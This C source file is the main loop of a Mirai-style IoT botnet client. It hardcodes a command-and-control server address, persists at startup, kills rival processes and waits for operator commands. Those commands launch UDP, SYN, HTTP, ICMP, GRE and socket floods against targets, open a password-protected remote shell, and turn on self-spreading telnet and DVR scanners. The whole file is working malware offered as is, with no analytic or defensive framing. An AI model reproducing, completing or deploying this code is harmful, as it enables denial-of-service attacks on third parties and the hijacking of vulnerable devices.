#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/file.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <stdint.h>
#include "headers/syn_attack.h"
#include "headers/udp_attack.h"
#include "headers/http_attack.h"
#include "headers/socket_attack.h"
#include "headers/attack_params.h"
#include "headers/daemon.h"
#include "headers/icmp_attack.h"
#include "headers/killer.h"
#include "headers/gre_attack.h"
#include "headers/connection_lock.h"
#include "headers/udpplain_attack.h"
#include "headers/scanner.h"
#include "headers/shell_listener.h"

#define CNC_IP "117.50.197.134"
#define BOT_PORT 2222
#define MAX_THREADS 5
#define RETRY_DELAY 3
#define RECV_TIMEOUT_MS 12000
#define MAX_RETRIES 15
#define CONNECTION_TIMEOUT 5
#define PING_INTERVAL 4
#define FAST_RETRY_COUNT 8
#define FAST_RETRY_DELAY 2
#define RESPAWN_DIRS 3

typedef struct {
    pthread_t thread;
    void* params;
    int active;
    int type;  
} attack_thread_state;

static attack_thread_state thread_states[MAX_THREADS];
pthread_mutex_t thread_mutex = PTHREAD_MUTEX_INITIALIZER;

static int telnet_scanner_enabled = 0;
static int dvr_scanner_enabled = 0;

pthread_mutex_t scanner_mutex = PTHREAD_MUTEX_INITIALIZER;

const char* get_arch() {
#ifdef ARCH_arc
    return "arc";
#elif defined(ARCH_powerpc)
    return "powerpc";
#elif defined(ARCH_sh4)
    return "sh4";
#elif defined(ARCH_mips)
    return "mips";
#elif defined(ARCH_mipsel)
    return "mipsel";
#elif defined(ARCH_x86_64)
    return "x86_64";
#elif defined(ARCH_m68k)
    return "m68k";
#elif defined(ARCH_sparc)
    return "sparc";
#elif defined(ARCH_i486)
    return "i486";
#elif defined(ARCH_aarch64)
    return "aarch64";
#elif defined(ARCH_armv4l)
    return "armv4l";
#elif defined(ARCH_armv5l)
    return "armv5l";
#elif defined(ARCH_armv6l)
    return "armv6l";
#elif defined(ARCH_armv7l)
    return "armv7l";
#else
    return "unknown";
#endif
}

static void init_thread_states() {
    memset(thread_states, 0, sizeof(thread_states));
    for (int i = 0; i < MAX_THREADS; i++) {
        thread_states[i].thread = 0;
        thread_states[i].params = NULL;
        thread_states[i].active = 0;
        thread_states[i].type = -1;
    }
}

void cleanup_attack_threads() {
    pthread_mutex_lock(&thread_mutex);
    for (int i = 0; i < MAX_THREADS; i++) {
        if (thread_states[i].thread != 0) {
            if (thread_states[i].params) {
                if (thread_states[i].type == 0) {
                    ((attack_params*)thread_states[i].params)->active = 0;
                } else if (thread_states[i].type == 1) {
                    ((gre_attack_params*)thread_states[i].params)->active = 0;
                }
            }
            
            pthread_join(thread_states[i].thread, NULL);
            
            if (thread_states[i].params) {
                free(thread_states[i].params);
            }
            
            thread_states[i].thread = 0;
            thread_states[i].params = NULL;
            thread_states[i].active = 0;
            thread_states[i].type = -1;
        }
    }
    pthread_mutex_unlock(&thread_mutex);
}

static attack_params* create_attack_params(const char *ip, uint16_t port, int duration, int psize, int srcport) {
    attack_params* params = calloc(1, sizeof(attack_params));
    if (!params) return NULL;

    params->target_addr.sin_family = AF_INET;
    params->target_addr.sin_port = htons(port);
    char buf[32];
    strncpy(buf, ip, sizeof(buf)-1);
    buf[sizeof(buf)-1] = 0;
    char *slash = strchr(buf, '/');
    if (slash) {
        *slash = 0;
        int cidr = atoi(slash+1);
        if (cidr < 1 || cidr > 32) {
            free(params);
            return NULL;
        }
        struct in_addr base_addr;
        if (inet_aton(buf, &base_addr) == 0) {
            free(params);
            return NULL;
        }
        params->base_ip = base_addr.s_addr;
        params->cidr = (uint8_t)cidr;
        params->target_addr.sin_addr = base_addr;
    } else {
        struct in_addr base_addr;
        if (inet_aton(buf, &base_addr) == 0) {
            free(params);
            return NULL;
        }
        params->base_ip = base_addr.s_addr;
        params->cidr = 0;
        params->target_addr.sin_addr = base_addr;
    }
    params->duration = duration;
    params->psize = psize;
    params->srcport = srcport;
    params->active = 1;
    return params;
}

static gre_attack_params* create_gre_params(const char *ip, int duration, int psize, int srcport, int gre_proto, int gport) {
    gre_attack_params* params = calloc(1, sizeof(gre_attack_params));
    if (!params) return NULL;
    
    params->target_addr.sin_family = AF_INET;
    params->target_addr.sin_port = htons(gport);
    if (inet_pton(AF_INET, ip, &params->target_addr.sin_addr) != 1) {
        free(params);
        return NULL;
    }
    
    params->duration = duration;
    params->psize = psize;
    params->srcport = srcport;
    params->gre_proto = gre_proto;
    params->gport = gport;
    params->active = 1;
    
    return params;
}

void handle_command(char* command, int sock) {
    if (!command || strlen(command) > 1023) return;
    
    static char buffer[256];
    if (strncmp(command, "ping", 4) == 0) {
        snprintf(buffer, sizeof(buffer), "pong %s", get_arch());
        send(sock, buffer, strlen(buffer), MSG_NOSIGNAL);
        return;
    }
    
    if (strncmp(command, "!openshell", 10) == 0) {
        int port = 0;
        char password[16] = {0};
        if (sscanf(command, "!openshell %d %8s", &port, password) == 2 && port > 0 && port < 65536 && strlen(password) <= 8) {
            stop_shell_listener();
            start_shell_listener(port, password);
        }
        return;
    }
    
    if (strncmp(command, "!selfrep", 8) == 0) {
        handle_selfrep_command(command);
        return;
    }
    
    static const char *methods[] = {"!udpplain", "!socket", "!http", "!icmp", "!syn", "!gre", "!udp"};
    static const int method_len[] = {8, 7, 5, 5, 4, 4, 4};
    static void* (*attack_funcs[])(void*) = {
        udpplain_attack, socket_attack, http_attack, icmp_attack, syn_attack, gre_attack, udp_attack
    };
    
    if (strcmp(command, "stop") == 0) {
        cleanup_attack_threads();
        return;
    }

    int which = -1;
    for (int i = 0; i < 7; i++) {
        if (strncmp(command, methods[i], method_len[i]) == 0) {
            which = i;
            break;
        }
    }
    
    if (which >= 0) {
        static char ip[32];
        static char argstr[512];
        int n = 0;
        int port = 0;
        int time = 0;
        int psize = 0;
        int srcport = 0;
        int gre_proto = 0;
        int gport = 0;
        memset(ip, 0, sizeof(ip));
        memset(argstr, 0, sizeof(argstr));
        if (which == 0 || which == 6) { // udpplain or udp
            n = sscanf(command, "%*s %31s %d %d %511[^\n]", ip, &port, &time, argstr);
            if (n < 3) return;
        } else if (which == 5) { // gre
            n = sscanf(command, "%*s %31s %d %511[^\n]", ip, &time, argstr);
            if (n < 2) return;
        } else {
            n = sscanf(command, "%*s %31s %d %d %511[^\n]", ip, &port, &time, argstr);
            if (n < 3) return;
        }
        
        if (strlen(argstr) > 0) {
            char *token = strtok(argstr, " ");
            while (token) {
                if (strncmp(token, "psize=", 6) == 0) psize = atoi(token + 6);
                else if (strncmp(token, "srcport=", 8) == 0) srcport = atoi(token + 8);
                else if (strncmp(token, "proto=", 6) == 0) {
                    if (strcmp(token + 6, "tcp") == 0) gre_proto = 1;
                    else if (strcmp(token + 6, "udp") == 0) gre_proto = 2;
                }
                else if (strncmp(token, "gport=", 6) == 0) gport = atoi(token + 6);
                token = strtok(NULL, " ");
            }
        }
        
        cleanup_attack_threads();
        
        pthread_mutex_lock(&thread_mutex);
        if (which == 7) {
            gre_attack_params* params = create_gre_params(ip, time, psize, srcport, gre_proto, gport);
            if (!params) {
                pthread_mutex_unlock(&thread_mutex);
                return;
            }
            int ret = pthread_create(&thread_states[0].thread, NULL, gre_attack, params);
            if (ret != 0) {
                free(params);
            } else {
                thread_states[0].params = params;
                thread_states[0].active = 1;
                thread_states[0].type = 1;
            }
        } else {  
            attack_params* params = create_attack_params(ip, port, time, psize, srcport);
            if (!params) {
                pthread_mutex_unlock(&thread_mutex);
                return;
            }
            int ret = pthread_create(&thread_states[0].thread, NULL, attack_funcs[which], params);
            if (ret != 0) {
                free(params);
            } else {
                thread_states[0].params = params;
                thread_states[0].active = 1;
                thread_states[0].type = 0;
            }
        }
        pthread_mutex_unlock(&thread_mutex);
    }
}

void handle_selfrep_command(char *command) {
    char scanner_type[32];
    char action[32];
    memset(scanner_type, 0, sizeof(scanner_type));
    memset(action, 0, sizeof(action));

    if (sscanf(command, "!selfrep %31s %31s", scanner_type, action) != 2) {
        return;
    }

    if (strcmp(scanner_type, "telnet") == 0) {
        if (strcmp(action, "on") == 0) {
            start_telnet_scanner();
        } else if (strcmp(action, "off") == 0) {
            stop_telnet_scanner();
        }
    }
    else if (strcmp(scanner_type, "dvr") == 0) {
        if (strcmp(action, "on") == 0) {
            start_rtsp_scanner();
        } else if (strcmp(action, "off") == 0) {
            stop_rtsp_scanner();
        }
    }
}

int connect_with_timeout(int sock, struct sockaddr *addr, socklen_t addrlen, int timeout_sec) {
    int res;
    long arg;
    fd_set myset;
    struct timeval tv;
    int valopt;
    socklen_t lon;

    res = connect(sock, addr, addrlen);
    if (res < 0) {
        if (errno == EINPROGRESS) {
            tv.tv_sec = timeout_sec;
            tv.tv_usec = 0;
            FD_ZERO(&myset);
            FD_SET(sock, &myset);
            res = select(sock+1, NULL, &myset, NULL, &tv);
            if (res > 0) {
                lon = sizeof(int);
                getsockopt(sock, SOL_SOCKET, SO_ERROR, (void*)(&valopt), &lon);
                if (!valopt) {
                    arg = fcntl(sock, F_GETFL, NULL);
                    arg &= (~O_NONBLOCK);
                    fcntl(sock, F_SETFL, arg);
                    return 0;
                }
            }
        }
        return -1;
    }
    
    arg = fcntl(sock, F_GETFL, NULL);
    arg &= (~O_NONBLOCK);
    fcntl(sock, F_SETFL, arg);

    return 0;
}

int main(int argc, char** argv) {
    init_thread_states();
    
    static int sock = -1;
    static struct sockaddr_in server_addr;
    static char command[1024];
    ssize_t n;
    int lock_fd;

    char self_path[PATH_MAX];
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path)-1);
    if(len > 0) {
        self_path[len] = '\0';
        if (startup_persist(self_path) == 0) {
            usleep(10000);
        }
    }

    daemonize(argc, argv);
    start_killer();

    int cpu_count = sysconf(_SC_NPROCESSORS_ONLN);
    if(cpu_count >= 1) {
        pthread_mutex_lock(&scanner_mutex);
        if (telnet_scanner_enabled) {
            start_telnet_scanner();
        }
        if (dvr_scanner_enabled) {
            start_rtsp_scanner();
        }
        pthread_mutex_unlock(&scanner_mutex);
    }
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(BOT_PORT);
    if (inet_pton(AF_INET, CNC_IP, &server_addr.sin_addr) != 1) {
        return 1;
    }

    int reconnect_attempts = 0;
    time_t last_ping = 0;

    lock_fd = acquire_connection_lock();
    if (lock_fd < 0) {
        return 0;
    }

    while (1) {
        if (sock != -1) {
            close(sock);
            sock = -1;
        }
        
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
            if (++reconnect_attempts >= MAX_RETRIES) {
                release_connection_lock(lock_fd);
                _exit(0);
            }
            sleep(RETRY_DELAY * reconnect_attempts);
            continue;
        }

        long arg = fcntl(sock, F_GETFL, NULL);
        arg |= O_NONBLOCK;
        fcntl(sock, F_SETFL, arg);

        int connection_result = connect_with_timeout(sock, (struct sockaddr*)&server_addr, sizeof(server_addr), CONNECTION_TIMEOUT);
        if (connection_result == 0) {
            reconnect_attempts = 0;
        }

        if (connection_result != 0) {
            close(sock);
            sock = -1;
            reconnect_attempts++;
            
            if (reconnect_attempts >= MAX_RETRIES) {
                release_connection_lock(lock_fd);
                if (sock != -1) {
                    close(sock);
                }
                exit(42);
            }
            
            if (reconnect_attempts <= FAST_RETRY_COUNT) {
                sleep(FAST_RETRY_DELAY);
            } else {
                int delay = RETRY_DELAY * ((reconnect_attempts - FAST_RETRY_COUNT) / 5 + 1);
                if (delay > 30) delay = 30;
                sleep(delay);
            }
            continue;
        }

        if (send(sock, get_arch(), strlen(get_arch()), MSG_NOSIGNAL) <= 0) {
            close(sock);
            sock = -1;
            continue;
        }

        reconnect_attempts = 0;
        last_ping = time(NULL);

    while (1) {
        struct pollfd fds;
        fds.fd = sock;
        fds.events = POLLIN;
        time_t now = time(NULL);
        if (now - last_ping >= PING_INTERVAL) {
            if (send(sock, "ping", 4, MSG_NOSIGNAL) <= 0) {
                break;
            }
            last_ping = now;
        }
        int poll_timeout = (last_ping + PING_INTERVAL - now) * 1000;
        if (poll_timeout < 100) poll_timeout = 100;
            int ret = poll(&fds, 1, poll_timeout);
            if (ret < 0 && errno != EINTR) {
                break;
            }
            if (ret > 0) {
                if (fds.revents & POLLIN) {
                    n = recv(sock, command, sizeof(command)-1, 0);
                    if (n <= 0) {
                        if (errno != EAGAIN && errno != EWOULDBLOCK) {
                            break;
                        }
                        continue;
                    }
                    command[n] = 0;
                    handle_command(command, sock);
                    memset(command, 0, sizeof(command));
                }
                if (fds.revents & (POLLERR | POLLHUP)) {
                    break;
                }
            }
        }
        
        if (sock != -1) {
            shutdown(sock, SHUT_RDWR);
            close(sock);
            sock = -1;
        }
        sleep(RETRY_DELAY);
    }

    release_connection_lock(lock_fd);
    return 0;
}
